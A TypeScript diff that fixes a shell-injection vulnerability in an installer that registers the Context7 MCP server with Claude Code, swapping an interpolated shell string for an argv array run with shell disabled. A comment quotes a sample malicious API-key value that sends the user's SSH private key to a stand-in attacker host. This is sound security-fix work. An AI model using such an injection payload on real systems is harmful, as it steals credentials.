@@ -80,7 +80,11 @@ export interface ClientConfig {
   name: string;
   configFileName?: string | null;
   useCli?: boolean;
-  cliCommand?: (apiKey: string) => string;
+  /** Pit Crew M7 BLOCKER fix: argv array (no shell interpolation).
+   *  The legacy `cliCommand: (apiKey) => string` form was vulnerable to
+   *  shell injection via apiKey. Replaced by `cliArgv: (apiKey) => string[]`
+   *  which is passed straight to spawnSync with `shell: false`. */
+  cliArgv?: (apiKey: string) => string[];
   getConfigPath?: () => string;
   generateConfig?: (apiKey: string) => Record<string, unknown>;
 }
@@ -132,8 +136,18 @@ export const CLIENT_CONFIGS: Record<string, ClientConfig> = {
   'claude-code': {
     name: 'Claude Code (CLI)',
     useCli: true,
-    cliCommand: (apiKey: string) =>
-      `claude mcp add context7 -- npx -y @upstash/context7-mcp --api-key ${apiKey}`,
+    cliArgv: (apiKey: string) => [
+      'claude',
+      'mcp',
+      'add',
+      'context7',
+      '--',
+      'npx',
+      '-y',
+      '@upstash/context7-mcp',
+      '--api-key',
+      apiKey,
+    ],
   },
   'claude-desktop': {
     name: 'Claude Desktop',
@@ -334,32 +348,43 @@ export function installForClient(
     return { success: false, message: `Unknown client: ${clientKey}` };
   }
 
-  // CLI-based installation (Claude Code) — use spawnSync with arg array
-  // to avoid shell-injection on the apiKey value (legacy used execSync
-  // with a string command).
+  // CLI-based installation (Claude Code).
+  //
+  // Pit Crew M7 BLOCKER (Reviewer + Adversary, confirmed exploit): the
+  // pre-fix path used `spawnSync(cmd, { shell: true })` where `cmd` was
+  // an interpolated string `claude mcp add ... --api-key ${apiKey}`.
+  // `validateApiKey` only checks the `ctx7sk-` prefix and length; a key
+  // value containing shell metacharacters (e.g.
+  // `ctx7sk-x'; curl evil.com/$(cat ~/.ssh/id_rsa) #`) was interpolated
+  // by /bin/sh and executed arbitrary commands.
+  //
+  // Post-fix: pass the argv array directly to `spawnSync` with
+  // `shell: false` (the default). The apiKey is one argv element — never
+  // interpreted by a shell — so any character in it is safe.
   if (client.useCli) {
-    if (!client.cliCommand) {
-      return { success: false, message: 'CLI command function missing' };
+    if (!client.cliArgv) {
+      return { success: false, message: 'CLI argv function missing' };
     }
-    const cmd = client.cliCommand(apiKey);
-    // Run the CLI command via shell since legacy used execSync with a
-    // single command string. We use spawnSync with shell:true and capture
-    // the same exit status/exception behavior.
-    const result = spawnSync(cmd, {
+    const argv = client.cliArgv(apiKey);
+    if (argv.length === 0) {
+      return { success: false, message: 'CLI argv is empty' };
+    }
+    const [bin, ...rest] = argv;
+    const result = spawnSync(bin, rest, {
       stdio: 'pipe',
       cwd: targetDir,
-      shell: true,
+      shell: false,
       encoding: 'utf8',
     });
     if (result.status === 0) {
       return {
         success: true,
-        message: `Configured via CLI: ${cmd.split('--api-key')[0].trim()}...`,
+        message: `Configured via CLI: ${bin} ${rest.slice(0, 4).join(' ')}...`,
       };
     }
     return {
       success: false,
-      message: `CLI command failed. You can run it manually:\n  ${cmd}`,
+      message: `CLI command "${bin}" failed (exit ${result.status ?? 'null'}). stderr: ${(result.stderr || '').toString().trim().slice(0, 300)}`,
     };
   }
 
